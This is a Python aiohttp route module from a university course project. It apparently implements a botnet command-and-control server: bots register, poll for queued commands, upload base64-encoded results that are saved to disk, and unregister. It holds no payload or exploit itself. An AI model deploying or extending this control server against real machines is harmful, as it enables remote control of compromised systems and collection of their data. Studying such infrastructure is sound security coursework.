# ===---------------------------------------------------------------------=== #
#
# CPSC4240 Project, Fall 24
# Adam Clements, Evan Cox, Isaac Fletcher, Tim Koehler
#
# ===---------------------------------------------------------------------=== #

from aiohttp import web
from aiohttp.web import Response
from aiohttp.web_request import Request
from context import GlobalContext
import asyncio
import base64
import pathlib
import unicodedata
import re


def slugify(value: str) -> str:
    """
    Modified `slugify` function from https://github.com/django/django/blob/master/django/utils/text.py

    Performs the following:
    1. Converts to ASCII 
    2. Converts spaces or repeated dashes to single dashes
    3. Removes characters that aren't alphanumerics, underscores, or hyphens. 
    4. Strips leading and trailing whitespace, dashes, and underscores.

    This prevents schenanigans with bot-given (i.e. unsafe) strings being used as part of a path.
    """
    value = str(value)
    value = unicodedata.normalize('NFKD', value)
    value = value.encode('ascii', 'ignore').decode('ascii')
    value = re.sub(r'[^\w\s-]', '', value)

    return re.sub(r'[-\s]+', '-', value).strip('-_')


async def init(request: Request) -> Response:
    ctx: GlobalContext = request.app["ctx"]
    id = ctx.create_bot()

    return web.json_response({"id": id})


def write_to_output(output: str, id: str, counter: int, data: bytes) -> None:
    try:
        path = pathlib.Path(f"{output}/{slugify(id)}")
        path.mkdir(parents=True, exist_ok=True)

        with open(path / str(counter), "wb") as f:
            f.write(data)

    except Exception as e:
        print(f"unable to write output, got error: {e}")


async def result(request: Request) -> Response:
    try:
        result = await request.json()
        loop = asyncio.get_running_loop()
        ctx: GlobalContext = request.app["ctx"]
        output_folder = request.app["output-folder"]
        id = result["id"]
        count = ctx.received_result_for(id)
        data = base64.standard_b64decode(result["result"])

        # write the result in the executor's thread pool to not block the event loop.
        # we want to still accept other requests while this is writing, file i/o is slow
        await loop.run_in_executor(None, lambda: write_to_output(output_folder, id, count, data))

        return web.Response(status=200)

    except Exception as e:
        print(f"error while processing result: {e} (result = {result})")

        return web.Response(status=400)


async def check(request: Request) -> Response:
    id = request.match_info.get("id")

    if id is None:
        return web.Response(status=400)

    ctx: GlobalContext = request.app["ctx"]
    commands = ctx.extract_commands(id)

    if commands is None:
        return web.Response(status=400)

    return web.json_response([command.as_dict() for command in commands])

async def unregister(request: Request) -> Response:
    id = request.match_info.get("id")
    ctx: GlobalContext = request.app["ctx"]
    
    if id is None:
        return web.Response(status=400)

    commands = ctx.remove_bot(id)

    if commands is None:
        return web.Response(status=400)

    return web.json_response([command.as_dict() for command in commands])

ALL_ROUTES = [
    web.get('/init', init),
    web.get("/check/{id}", check),
    web.get("/unregister/{id}", unregister),
    web.post("/result", result)
]
